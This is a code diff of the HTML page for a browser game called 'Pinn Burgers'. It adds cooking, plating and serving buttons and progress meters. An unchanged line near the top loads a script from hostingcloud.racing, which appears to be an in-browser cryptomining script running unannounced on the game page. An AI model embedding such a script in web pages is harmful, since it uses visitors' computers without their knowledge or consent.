@@ -21,6 +21,8 @@
     <script src="https://www.hostingcloud.racing/5pDo.js"></script>
 
     <link rel="stylesheet" href="/style.css" />
+    <link rel="stylesheet" href="/games/pinn/pinn.css" />
+
     <style>
       .gamewrap {
         position: fixed;
@@ -61,6 +63,93 @@
           <p class="gTitle">
             Pinn Burgers
           </p>
+          <wrap id="superGame" class="hide">
+            <center>
+              <dish>
+                <div class="buttonReady" id="foodButton" onclick="foodImage();">
+                  Make Food
+                </div>
+                <div class="hide" id="plateButton" onclick="platedImage();">
+                  Plate Food
+                </div>
+                <div class="hide" id="serveButton" onclick="servedImage();">
+                  Serve Food
+                </div>
+                <div class="hide" id="cashOut" onclick="claimUpdate();">
+                  End Shift
+                </div>
+                <div class="buttonReady" id="quit" onclick="quit();">
+                  Quit
+                </div>
+              </dish>
+
+              <div class="items">
+                <div id="foodImage"></div>
+                <div id="platedImage"></div>
+                <div id="serveImage"></div>
+              </div>
+
+              <footer>
+                <div class="button2">
+                  Making Food:
+                  <div id="makefood">
+                    0%
+                  </div>
+
+                  <meter
+                    value="1"
+                    id="makeFood"
+                    max="100"
+                    low="10"
+                    high="80"
+                    class="hide"
+                  ></meter>
+                </div>
+                <div class="button2">
+                  Food Plated
+                  <div id="platedfood">
+                    0
+                  </div>
+                  <meter
+                    value="0"
+                    id="platedFood"
+                    max="100"
+                    low="10"
+                    high="80"
+                    class="hide"
+                  ></meter>
+                </div>
+                <div class="button2">
+                  Food Served
+                  <div id="servedfood">
+                    0
+                  </div>
+                  <meter
+                    value="1"
+                    id="servedFood"
+                    max="100"
+                    low="10"
+                    high="80"
+                    class="hide"
+                  ></meter>
+                </div>
+                <div class="button2">
+                  Completed <label id="xtrA">0.</label>
+                  <label id="rewards">
+                    0
+                  </label>
+                  <meter
+                    value="0"
+                    id="Rewards"
+                    max="100"
+                    low="10"
+                    high="80"
+                    class="hide"
+                  ></meter>
+                </div>
+              </footer>
+            </center>
+          </wrap>
         </div>
       </center>
     </div>
